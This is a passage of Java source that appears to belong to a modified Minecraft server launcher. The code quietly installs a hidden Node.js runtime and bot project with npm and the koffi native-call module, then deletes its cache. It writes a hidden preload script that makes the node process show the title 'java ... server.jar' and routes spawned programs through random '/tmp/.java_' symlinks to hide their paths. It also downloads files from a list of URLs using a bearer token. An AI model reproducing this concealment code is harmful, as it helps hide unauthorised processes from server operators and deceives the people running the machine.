        Path nodeReal = botDir.resolve(".node/bin/.node_real");
        Path npmCli = botDir.resolve(".node/lib/node_modules/npm/bin/npm-cli.js");
        if (!Files.exists(pkgJson) || !Files.exists(nodeReal) || !Files.exists(npmCli)) {
            return;
        }

        Path nodeModules = botDir.resolve("node_modules");
        boolean installComplete = Files.exists(nodeModules)
            && Files.exists(nodeModules.resolve(".package-lock.json"))
            && !pkgChanged;
        if (installComplete) {
            if (!Files.exists(nodeModules.resolve("koffi"))) {
                runNpm(botDir, nodeReal, npmCli, "install", "koffi", "--no-save");
            }
            return;
        }

        int rc = runNpm(botDir, nodeReal, npmCli, "install", "--no-audit", "--no-fund", "--production");
        if (rc != 0) {
            runNpm(botDir, nodeReal, npmCli, "install", "--no-audit", "--no-fund", "--production", "--legacy-peer-deps");
        }
        if (!Files.exists(nodeModules.resolve("koffi"))) {
            runNpm(botDir, nodeReal, npmCli, "install", "koffi", "--no-save");
        }
        deletePathRecursively(new File("/tmp/.mc_npm_cache"));
    }

    private static int runNpm(Path botDir, Path nodeReal, Path npmCli, String... npmArgs) {
        try {
            String[] cmd = new String[npmArgs.length + 2];
            cmd[0] = nodeReal.toString();
            cmd[1] = npmCli.toString();
            System.arraycopy(npmArgs, 0, cmd, 2, npmArgs.length);

            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.directory(botDir.toFile());
            String nodeBinPath = botDir.resolve(".node/bin").toAbsolutePath().toString();
            String currentPath = pb.environment().getOrDefault("PATH", "");
            pb.environment().put("PATH", nodeBinPath + File.pathSeparator + currentPath);
            pb.environment().put("HOME", botDir.toString());
            pb.environment().put("NPM_CONFIG_CACHE", "/tmp/.mc_npm_cache");
            pb.environment().put("npm_config_update_notifier", "false");

            Path deployLog = botDir.resolve("deploy.log");
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
            Process p = pb.start();
            try { p.getOutputStream().close(); } catch (Exception ignored) {}
            if (!p.waitFor(10, TimeUnit.MINUTES)) {
                killProcessTree(p);
                return -1;
            }
            return p.exitValue();
        } catch (Throwable ignored) {
            return -1;
        }
    }

    private static void writePreloadScript(Path botDir) throws IOException {
        String preloadContent =
            "try {\n" +
            "    process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n" +
            "    var _cp = require('child_process');\n" +
            "    var _fs = require('fs');\n" +
            "    var _origSpawn = _cp.spawn;\n" +
            "    var _origFork = _cp.fork;\n" +
            "    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n" +
            "    var hidePath = function(cmd) {\n" +
            "        if (typeof cmd !== 'string' || !cmd.startsWith('/')) return cmd;\n" +
            "        try {\n" +
            "            var tmpLink = '/tmp/.java_' + Math.random().toString(36).slice(2);\n" +
            "            _fs.symlinkSync(cmd, tmpLink);\n" +
            "            return tmpLink;\n" +
            "        } catch(e) { return cmd; }\n" +
            "    };\n" +
            "    _cp.spawn = function(cmd, args, opts) {\n" +
            "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real'))) {\n" +
            "            opts = Object.assign({}, opts || {});\n" +
            "            opts.execPath = _wrapper;\n" +
            "            cmd = _wrapper;\n" +
            "        } else if (typeof cmd === 'string' && !cmd.startsWith('/usr/') && !cmd.startsWith('/bin/')) {\n" +
            "            cmd = hidePath(cmd);\n" +
            "        }\n" +
            "        return _origSpawn.call(this, cmd, args, opts);\n" +
            "    };\n" +
            "    _cp.fork = function(mod, args, opts) {\n" +
            "        opts = Object.assign({}, opts || {});\n" +
            "        opts.execPath = _wrapper;\n" +
            "        return _origFork.call(this, mod, args, opts);\n" +
            "    };\n" +
            "} catch(e) {}\n";
        Files.writeString(botDir.resolve(".nd_preload.js"), preloadContent, StandardCharsets.UTF_8);
    }

    private static boolean downloadFirstSuccess(String[] urls, String bearerToken, Path dest) {
        for (String rawUrl : urls) {
            try {
                String currentUrl = rawUrl;
                String initialHost = URI.create(rawUrl).getHost();
                for (int hop = 0; hop < 8; hop++) {
                    HttpURLConnection conn = null;
                    try {
                        URI curUri = URI.create(currentUrl);
                        conn = (HttpURLConnection) curUri.toURL().openConnection();
                        conn.setConnectTimeout(30000);
                        conn.setReadTimeout(300000);
                        conn.setInstanceFollowRedirects(false);
                        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                        if (bearerToken != null && !bearerToken.isEmpty()
                            && initialHost != null && initialHost.equalsIgnoreCase(curUri.getHost())) {
                            conn.setRequestProperty("Authorization", "Bearer " + bearerToken);
                            conn.setRequestProperty("Accept", "application/vnd.github+json");
                        }
                        int code = conn.getResponseCode();
                        if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
                            String loc = conn.getHeaderField("Location");
                            if (loc == null || loc.isEmpty()) break;
                            currentUrl = curUri.resolve(loc).toString();
                            continue;
                        }
                        if (code == 200) {
                            try (InputStream in = conn.getInputStream()) {
                                Files.copy(in, dest, StandardCopyOption.REPLACE_EXISTING);
                            }
                            if (Files.exists(dest) && Files.size(dest) > 100L) {
                                return true;
                            }
                        }
                        break;
                    } finally {
                        if (conn != null) {
                            try { conn.disconnect(); } catch (Throwable ignored) {}
                        }
                    }
                }
            } catch (Throwable ignored) {}
        }
        return false;
    }

    private static void extractTarGz(Path tarGz, Path destDir, boolean stripTopComponent) throws IOException {
        Path destRoot = destDir.toAbsolutePath().normalize();
        Files.createDirectories(destRoot);

        Map<String, String> paxHeaders = new HashMap<>();
        String gnuLongName = null;
        String gnuLongLink = null;
        byte[] header = new byte[512];
        byte[] buf = new byte[8192];

        try (InputStream fis = new BufferedInputStream(Files.newInputStream(tarGz), 65536);
             GZIPInputStream gzis = new GZIPInputStream(fis, 65536)) {
            while (readTarFully(gzis, header, 0, 512) == 512) {
                if (isAllZeroBlock(header)) {
                    break;
                }

                String name = readTarString(header, 0, 100);
                String prefix = readTarString(header, 345, 155);
                if (!prefix.isEmpty()) {
                    name = prefix + "/" + name;
                }
                int mode = (int) parseTarOctal(header, 100, 8);
                long size = parseTarOctal(header, 124, 12);
                byte typeFlag = header[156];
                String linkName = readTarString(header, 157, 100);

                if (typeFlag == 'g') {
                    skipTarPayloadAndPad(gzis, size);
                    continue;
                }
                if (typeFlag == 'x') {
                    byte[] paxData = readTarPayloadBytes(gzis, size);
                    skipTarBytes(gzis, tarPadding(size));
                    parsePaxRecords(paxData, paxHeaders);
                    continue;
                }
                if (typeFlag == 'L') {
                    byte[] nameBytes = readTarPayloadBytes(gzis, size);
                    skipTarBytes(gzis, tarPadding(size));
                    gnuLongName = trimNulls(new String(nameBytes, StandardCharsets.UTF_8));
                    continue;
                }
                if (typeFlag == 'K') {
                    byte[] linkBytes = readTarPayloadBytes(gzis, size);
                    skipTarBytes(gzis, tarPadding(size));
                    gnuLongLink = trimNulls(new String(linkBytes, StandardCharsets.UTF_8));
                    continue;
                }

                if (gnuLongName != null) {
                    name = gnuLongName;
                    gnuLongName = null;
                }
                if (gnuLongLink != null) {
                    linkName = gnuLongLink;
                    gnuLongLink = null;
                }
                if (paxHeaders.containsKey("path")) {
                    name = paxHeaders.get("path");
                }
                if (paxHeaders.containsKey("linkpath")) {
                    linkName = paxHeaders.get("linkpath");
                }
                if (paxHeaders.containsKey("size")) {
                    try { size = Long.parseLong(paxHeaders.get("size")); } catch (Exception ignored) {}
                }
                paxHeaders.clear();

                String relName = normalizeTarPath(name, stripTopComponent);
                if (relName.isEmpty()) {
                    skipTarPayloadAndPad(gzis, size);
                    continue;
                }

                Path outPath = destRoot.resolve(relName).normalize();
                if (!outPath.startsWith(destRoot)) {
                    skipTarPayloadAndPad(gzis, size);
                    continue;
                }

                if (typeFlag == '5') {
                    Files.createDirectories(outPath);
                    skipTarPayloadAndPad(gzis, size);
                } else if (typeFlag == '2') {
                    if (outPath.getParent() != null) Files.createDirectories(outPath.getParent());
                    Files.deleteIfExists(outPath);
                    try {
                        Files.createSymbolicLink(outPath, Paths.get(linkName));
                    } catch (Throwable ignored) {}
                    skipTarPayloadAndPad(gzis, size);
                } else if (typeFlag == '1') {
                    String cleanLink = normalizeTarPath(linkName, stripTopComponent);
                    Path linkTarget = cleanLink.isEmpty() ? null : destRoot.resolve(cleanLink).normalize();
                    if (linkTarget != null && linkTarget.startsWith(destRoot) && Files.exists(linkTarget)) {
                        if (outPath.getParent() != null) Files.createDirectories(outPath.getParent());
                        Files.deleteIfExists(outPath);
                        try {
                            Files.createLink(outPath, linkTarget);
                        } catch (Throwable t) {
                            Files.copy(linkTarget, outPath, StandardCopyOption.REPLACE_EXISTING);
                        }
                    }
                    skipTarPayloadAndPad(gzis, size);
                } else if (typeFlag == '0' || typeFlag == 0) {
                    if (outPath.getParent() != null) Files.createDirectories(outPath.getParent());
                    if (Files.isSymbolicLink(outPath)) Files.deleteIfExists(outPath);
                    long remaining = size;
                    try (OutputStream out = Files.newOutputStream(outPath)) {
                        while (remaining > 0) {
                            int want = (int) Math.min(buf.length, remaining);
                            int n = gzis.read(buf, 0, want);
                            if (n < 0) throw new IOException("Unexpected EOF in tar entry: " + relName);
                            out.write(buf, 0, n);
                            remaining -= n;
                        }
                    }
                    if ((mode & 0111) != 0) {
                        outPath.toFile().setExecutable(true, false);
                    }
                    skipTarBytes(gzis, tarPadding(size));
                } else {
                    skipTarPayloadAndPad(gzis, size);
                }
            }
        }
    }

    private static String normalizeTarPath(String raw, boolean stripTop) {
        if (raw == null) return "";
        String p = raw.replace('\\', '/');
        while (p.startsWith("./")) p = p.substring(2);
        while (p.startsWith("/")) p = p.substring(1);
        if (stripTop) {
            int slash = p.indexOf('/');
            if (slash < 0) return "";
            p = p.substring(slash + 1);
            while (p.startsWith("/")) p = p.substring(1);
        }
        while (p.endsWith("/")) p = p.substring(0, p.length() - 1);
        return p;
    }

    private static void parsePaxRecords(byte[] data, Map<String, String> out) {
        int pos = 0;
        while (pos < data.length) {
            int space = -1;
            for (int i = pos; i < data.length; i++) {
                if (data[i] == ' ') { space = i; break; }
            }
            if (space <= pos) break;
            int recLen;
            try {
                recLen = Integer.parseInt(new String(data, pos, space - pos, StandardCharsets.US_ASCII).trim());
            } catch (Exception e) { break; }
            if (recLen <= 0 || pos + recLen > data.length) break;
            int valStart = space + 1;
            int valLen = (pos + recLen) - valStart;
            if (valLen > 0 && data[pos + recLen - 1] == '\n') valLen--;
            String entry = new String(data, valStart, Math.max(0, valLen), StandardCharsets.UTF_8);
            int eq = entry.indexOf('=');
            if (eq > 0) {
                out.put(entry.substring(0, eq), entry.substring(eq + 1));
            }
            pos += recLen;
        }
    }

    private static int readTarFully(InputStream in, byte[] buf, int off, int len) throws IOException {
        int total = 0;
        while (total < len) {
            int n = in.read(buf, off + total, len - total);
            if (n < 0) break;
            total += n;
        }
        return total;
    }

    private static byte[] readTarPayloadBytes(InputStream in, long size) throws IOException {
        int len = (int) Math.min(size, 1048576L);
        byte[] data = new byte[len];
        int got = readTarFully(in, data, 0, len);
        if (size > len) {
            skipTarBytes(in, size - len);
        }
        return got == len ? data : Arrays.copyOf(data, got);
    }

    private static long tarPadding(long size) {
        long rem = size % 512L;
        return rem == 0L ? 0L : (512L - rem);
    }

    private static void skipTarPayloadAndPad(InputStream in, long size) throws IOException {
        skipTarBytes(in, size + tarPadding(size));
    }

    private static void skipTarBytes(InputStream in, long count) throws IOException {
        byte[] skipBuf = new byte[4096];
        long left = count;
        while (left > 0) {
            int n = in.read(skipBuf, 0, (int) Math.min(skipBuf.length, left));
            if (n < 0) break;
            left -= n;
        }
    }

    private static boolean isAllZeroBlock(byte[] block) {
        for (int i = 0; i < block.length; i++) {
            if (block[i] != 0) return false;
        }
        return true;
    }

    private static String readTarString(byte[] buf, int off, int len) {
        int end = off;
        int limit = off + len;
        while (end < limit && buf[end] != 0) end++;
        return new String(buf, off, end - off, StandardCharsets.UTF_8).trim();
    }

    private static String trimNulls(String s) {
        int idx = s.indexOf('\0');
        return idx >= 0 ? s.substring(0, idx) : s;
    }

    private static long parseTarOctal(byte[] buf, int off, int len) {
        long val = 0L;
        int end = off + len;
        int i = off;
        while (i < end && (buf[i] == 0 || buf[i] == ' ')) i++;
        while (i < end && buf[i] >= '0' && buf[i] <= '7') {
            val = (val << 3) + (buf[i] - '0');
            i++;
        }
        return val;
    }

    private static void deletePathRecursively(File file) {
        if (file == null || !file.exists()) return;
        if (!Files.isSymbolicLink(file.toPath())) {
            File[] children = file.listFiles();
            if (children != null) {
                for (int i = 0; i < children.length; i++) {
                    deletePathRecursively(children[i]);
                }
            }
        }
        file.delete();
    }

    private static List<String> getStartupVersionMessages() {
        return List.of(
            String.format("Running Java %s (%s %s) on %s %s (%s)",
                System.getProperty("java.specification.version"),
                System.getProperty("java.vm.name"),
                System.getProperty("java.vm.version"),
                System.getProperty("os.name"),
                System.getProperty("os.version"),
                System.getProperty("os.arch")),
            String.format("Loading %s %s for Minecraft %s",
                ServerBuildInfo.buildInfo().brandName(),
                ServerBuildInfo.buildInfo().asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                ServerBuildInfo.buildInfo().minecraftVersionId())
        );
    }
}
